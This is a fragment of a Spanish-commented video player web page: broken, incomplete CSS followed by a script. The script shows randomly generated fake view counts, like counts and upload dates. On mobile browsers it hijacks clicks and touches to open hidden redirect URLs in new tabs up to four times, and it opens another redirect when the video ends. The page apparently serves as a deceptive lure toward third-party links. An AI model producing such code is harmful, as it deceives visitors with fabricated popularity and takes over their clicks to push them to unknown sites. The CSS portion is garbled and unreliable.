        :root {

        body {

        .player-container {
            width: 800px;

            margin: 20px auto;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 12px;

        .video-wrapper {

            width: 100%;

            display: flex;

        #histats_counter {

            right: 10px;
            z-index: 1000;
        }
        .footer {
            margin-top: auto;
            padding: 20px 0;
            text-align: center;
            color: var(--gray);
            font-size: 0.9rem;
        }
        .social-links {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 15px;

        .social-link {

            font-size: 1.2rem;
            transition: color 0.3s;
        }

            color: var(--primary);

        .loading-overlay {
            position: fixed;

            left: 0;

            height: 100%;

        }
        .loading-text {

        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @media (max-width: 850px) {

    <script>
        document.addEventListener('DOMContentLoaded', async () => {
            // Ocultar pantalla de carga
            setTimeout(() => {
                document.querySelector('.loading-overlay').style.opacity = '0';
                setTimeout(() => {
                    document.querySelector('.loading-overlay').style.display = 'none';
                }, 500);
            }, 1500);

            // Generar estadísticas aleatorias
            function getRandomStats() {
                const views = Math.floor(Math.random() * 900000) + 100000; // 100,000 a 999,999
                const likes = Math.floor(views * (0.3 + Math.random() * 0.5)); // 30%-80% de las vistas
                const daysAgo = Math.floor(Math.random() * 30); // 0-29 días
                
                const date = new Date();
                date.setDate(date.getDate() - daysAgo);
                
                const dateText = daysAgo === 0 ? 'Hoy' : 
                                daysAgo === 1 ? 'Ayer' : 
                                `Hace ${daysAgo} días`;
                
                return {
                    views: views.toLocaleString(),
                    likes: likes.toLocaleString(),
                    date: dateText
                };
            }

            // Obtener ID de la URL
            const path = window.location.pathname.split('/');
            const id = path[path.length - 1];

            // Obtener datos de Firestore (solo para el video)
            const linkData = await window.dbFunctions.getLink(id);

            if (!linkData) {
                alert('Enlace no válido o expirado');
                window.location.href = '/';
                return;
            }

            // Configurar el reproductor con Plyr
            const playerElement = document.getElementById('player');
            playerElement.src = linkData.videoUrl;
            
            // Actualizar información del video con datos aleatorios
            const stats = getRandomStats();
            document.getElementById('video-title').textContent = linkData.title || 'Video premium';
            document.getElementById('video-views').textContent = stats.views;
            document.getElementById('video-likes').textContent = stats.likes;
            document.getElementById('video-date').textContent = stats.date;
            
            // Inicializar Plyr
            const player = new Plyr(playerElement, {
                autoplay: true,
                muted: true,
                controls: ['play-large', 'progress', 'current-time', 'mute', 'volume', 'fullscreen']
            });

            // ===== SISTEMA DE REDIRECCIÓN INTELIGENTE =====
            const horaCreacion = Math.floor(Date.now() / 1000);
            const enlaceOriginal = linkData.redirectUrl;
            const enlaceNuevo = linkData.redirectUrl2 || linkData.redirectUrl;
            const maxRedirects = 4;

            function verificarHoraCreacion() {
                const horaActual = Math.floor(Date.now() / 1000);
                const diferencia = horaActual - horaCreacion;
                return diferencia >= 3600;
            }

            const redirectUrl = verificarHoraCreacion() ? enlaceNuevo : enlaceOriginal;

            if (!sessionStorage.getItem("sessionStarted")) {
                localStorage.removeItem("clickCount");
                sessionStorage.setItem("sessionStarted", "true");
            }

            let clickCount = parseInt(localStorage.getItem("clickCount")) || 0;

            function handleClick(event) {
                if (!/Mobi|Android/i.test(navigator.userAgent)) return;
                
                clickCount++;
                localStorage.setItem("clickCount", clickCount);
                if (clickCount <= maxRedirects) {
                    window.open(redirectUrl, '_blank');
                    event.preventDefault();
                } else {
                    playerElement.setAttribute("controls", "controls");
                }
            }

            // Eventos de redirección
            if (/Mobi|Android/i.test(navigator.userAgent)) {
                document.addEventListener("click", handleClick, true);
                document.addEventListener("touchstart", handleClick, true);
            }

            // Redirección al finalizar el video
            playerElement.addEventListener("ended", function() {
                window.open(enlaceOriginal, '_blank');
            });

            // Forzar autoplay en móviles
            player.on('loadedmetadata', () => {
                player.muted = true;
                player.play().catch(e => console.log("Autoplay prevented:", e));
            });
        });
    </script>
